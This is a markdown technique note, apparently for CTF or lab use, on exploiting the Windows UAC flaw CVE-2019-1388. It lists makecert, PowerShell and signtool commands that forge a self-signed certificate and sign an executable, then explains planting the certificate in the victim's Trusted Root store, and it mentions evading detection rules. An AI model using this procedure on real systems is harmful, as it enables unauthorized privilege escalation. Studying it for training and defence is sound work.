# CVE-2019-1388 Self-Signed Certificate Technique
This technique could be useful in exploiting CVE-2019-1388, for example working around [system misconfiguations that prevent launching HTTP(S) URLs][tryhackme], or avoiding some detection rules.

This information was sourced from [@OmriInbar][] on twitter, it is transcribed and notated here for ease of use.

[tryhackme]: https://tryhackme.com/room/retro
[@OmriInbar]: https://twitter.com/OmriInbar/status/1198659244456914947
	(It's funny to see the CVE being referred to as the "hhupd.exe Exploit". If you don't care about your exe being signed then you can create your own exe that will work perfectly. you just need the added step of installing the certificate at the Trusted Root store)

## Environment
- Using powershell
- Working in C:\temp
- makecert.exe and signtool.exe copied to C:\temp
- calc.exe copied to C:\temp

## Make Cert
[MakeCert.exe Documentation](https://docs.microsoft.com/en-us/windows/win32/seccrypto/makecert)

The elevated process is launched via whatever URL we provide to the `-l` option. We are not restricted to using HTTP(S), for example `ftp://` URLs can also launch Internet Explorer.
````
.\makecert.exe -r -pe -n "OU=fake inc; O=fake; L=Internet" -ss My -sky exchange -sp "Microsoft Enhanced RSA and AES Cryptographic Provider" -l "https://localhost/" -sy 24 C:\temp\out.cer -e 12/31/2050
````
| Option					| Description	|
|---						|---			|
| -r						| Creates a self-signed certificate. |
| -pe						| Marks the private key as exportable. |
| -n "Name"					| Name for the publisher's certificate. This name must conform to the X.500 standard. |
| -ss SubjectCertStoreName	| Name of the subject's certificate store where the generated certificate will be stored.|
| -sky SubjectKeySpec		| Subject's key specification. |
| -sp SubjectProviderName	| CryptoAPI provider for subject. |
| -l PolicyLink				| Link to SPC agency policy information (for example, a URL). |
| -sy nSubjectProviderType	| CryptoAPI provider type for subject. |
| -e DateEnd				| Date when the validity period ends. |

## Convert .cer to .pfx using powershell
````
$Convert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("C:\temp\out.cer");
$out = $Convert.Export("pfx","12345678");
[System.IO.File]::WriteAllBytes("C:\temp\out.pfx", $out);
````

## Sign an exe
[SignTool.exe Documentation](https://docs.microsoft.com/en-us/windows/win32/seccrypto/signtool#sign-command-options)
````
.\signtool.exe sign /f "C:\temp\out.pfx" /d "fake" /p "12345678" "C:\temp\calc.exe"
````
| Option			| Description	|
|---				|---			|
| /f SignCertFile	| Specifies the signing certificate in a file. |
| /d Desc			| Specifies a description of the signed content. |
| /p Password		| Specifies the password to use when opening a PFX file. |

## Exploiting

As noted in the source tweet there is one extra step of importing the certificate into the Trusted Root Store on the victim machine.
![Right click on the "signed" exe file and open Properties, go to the Digitial Signatures tab: highlight the signature and click Details, click View Certificate, then click Install Certificate, select Store Location as Current User, then browse to and select the Trusted Root Certification Authorities store and comlete the wizard, then proceed with the exploit as normal.](import-cert.png)
